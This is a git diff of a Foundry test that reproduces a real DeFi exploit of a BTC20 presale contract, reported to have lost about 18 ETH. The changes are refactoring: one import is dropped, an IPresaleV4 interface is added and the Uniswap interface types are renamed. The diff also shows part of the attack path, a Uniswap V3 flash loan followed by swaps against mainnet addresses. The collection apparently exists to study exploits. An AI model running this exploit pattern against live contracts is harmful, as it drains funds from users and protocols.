@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~18ETH
 // Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
@@ -14,17 +13,25 @@ import "./../interface.sol";
 // Twitter Guy : https://twitter.com/DecurityHQ/status/1692924369662513472
 // Hacking God : https://www.google.com/
 
+interface IPresaleV4 {
+
+    function directTotalTokensSold() external view returns (uint256);
+    function maxTokensToSell() external view returns (uint256);
+    function buyWithEthDynamic(uint256 amount) external payable returns (bool);
+
+}
+
 contract ContractTest is Test {
 
     IERC20 BTC20 = IERC20(0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18);
     IERC20 SDEX = IERC20(0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF);
     IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    Uni_Pair_V3 SDEX_BTC20_Pair3 = Uni_Pair_V3(0xDb81b8cfB2718f7289ae2365DE800ac2c787E385);
-    Uni_Pair_V3 BTC20_WETH_Pair3 = Uni_Pair_V3(0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e);
-    Uni_Router_V3 uniRouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    Uni_Pair_V2 BTC20_WETH_Pair2 = Uni_Pair_V2(0xd50C5B8f04587D67298915E099E170af3Cd6909A);
+    IUniswapV3Pair SDEX_BTC20_Pair3 = IUniswapV3Pair(0xDb81b8cfB2718f7289ae2365DE800ac2c787E385);
+    IUniswapV3Pair BTC20_WETH_Pair3 = IUniswapV3Pair(0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e);
+    IUniswapV3Router uniRouterV3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV2Router uniRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Pair BTC20_WETH_Pair2 = IUniswapV2Pair(0xd50C5B8f04587D67298915E099E170af3Cd6909A);
     IPresaleV4 PresaleV4 = IPresaleV4(0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7);
     address[] private addrPath = new address[](2);
     uint256 Amount_SDEX_BTC20_Pair3 = 76_301_042_059_171_907_852_637;
@@ -71,7 +78,7 @@ contract ContractTest is Test {
         SDEX_BTC20_Pair3.flash(address(this), 0, Amount_SDEX_BTC20_Pair3, abi.encode(Amount_SDEX_BTC20_Pair3));
 
         (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
-        Uni_Router_V3.ExactInputSingleParams memory eisParams = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory eisParams = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(BTC20),
             tokenOut: address(SDEX),
             fee: 10_000,
